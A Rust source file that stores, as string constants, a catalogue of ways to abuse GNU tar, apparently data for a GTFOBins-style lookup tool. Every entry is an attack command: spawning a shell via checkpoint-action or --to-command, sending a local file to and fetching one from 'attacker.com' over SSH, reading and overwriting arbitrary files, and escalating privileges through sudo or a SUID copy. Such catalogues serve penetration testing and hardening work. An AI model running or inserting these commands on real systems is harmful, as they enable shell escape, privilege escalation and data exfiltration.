pub static BIN_NAME: &'static str = "tar";
pub static SH_CODE_1: &'static str = r#"
    
    tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
"#;
pub static SH_DESC_2: &'static str = "This only works for GNU tar.";
pub static SH_CODE_2: &'static str = r#"
    
    tar xf /dev/null -I '/bin/sh -c "sh <&2 1>&2"'
"#;
pub static SH_DESC_3: &'static str = "This only works for GNU tar. It can be useful when only a limited command argument injection is available.";
pub static SH_CODE_3: &'static str = r#"
    
    TF=$(mktemp)
    echo '/bin/sh 0<&1' > "$TF"
    tar cf "$TF.tar" "$TF"
    tar xf "$TF.tar" --to-command sh
    rm "$TF"*
"#;
pub static FU_DESC: &'static str = "This only works for GNU tar. Create tar archive and send it via SSH to a remote location. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).";
pub static FU_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RUSER=root
    RFILE=/tmp/file_to_send.tar
    LFILE=file_to_send
    tar cvf $RUSER@$RHOST:$RFILE $LFILE --rsh-command=/bin/ssh
"#;
pub static FD_DESC: &'static str = "This only works for GNU tar. Download and extract a tar archive via SSH. The attacker box must have the `rmt` utility installed (it should be present by default in Debian-like distributions).";
pub static FD_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RUSER=root
    RFILE=/tmp/file_to_get.tar
    tar xvf $RUSER@$RHOST:$RFILE --rsh-command=/bin/ssh
"#;
pub static FW_DESC: &'static str = "This only works for GNU tar.";
pub static FW_CODE: &'static str = r#"
    
    LFILE=file_to_write
    TF=$(mktemp)
    echo DATA > "$TF"
    tar c --xform "s@.*@$LFILE@" -OP "$TF" | tar x -P
"#;
pub static FR_DESC: &'static str = "This only works for GNU tar.";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    tar xf "$LFILE" -I '/bin/sh -c "cat 1>&2"'
"#;
pub static SUDO_CODE: &'static str = r#"
    
    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
"#;
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which tar) .

    ./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH_1: Code<'static> = Code {
    title: "SH_CODE_1",
    code: SH_CODE_1,
    tag: Tag::SH,
};
pub static SH_2: Code<'static> = Code {
    title: "SH_CODE_2",
    code: SH_CODE_2,
    tag: Tag::SH,
};
pub static SH_3: Code<'static> = Code {
    title: "SH_CODE_3",
    code: SH_CODE_3,
    tag: Tag::SH,
};
pub static FU: Code<'static> = Code {
    title: "FU_CODE",
    code: FU_CODE,
    tag: Tag::FU,
};
pub static FD: Code<'static> = Code {
    title: "FD_CODE",
    code: FD_CODE,
    tag: Tag::FD,
};
pub static FW: Code<'static> = Code {
    title: "FW_CODE",
    code: FW_CODE,
    tag: Tag::FW,
};
pub static FR: Code<'static> = Code {
    title: "FR_CODE",
    code: FR_CODE,
    tag: Tag::FR,
};
pub static SUDO: Code<'static> = Code {
    title: "SUDO_CODE",
    code: SUDO_CODE,
    tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code {
    title: "LSUID_CODE",
    code: LSUID_CODE,
    tag: Tag::LSUID,
};
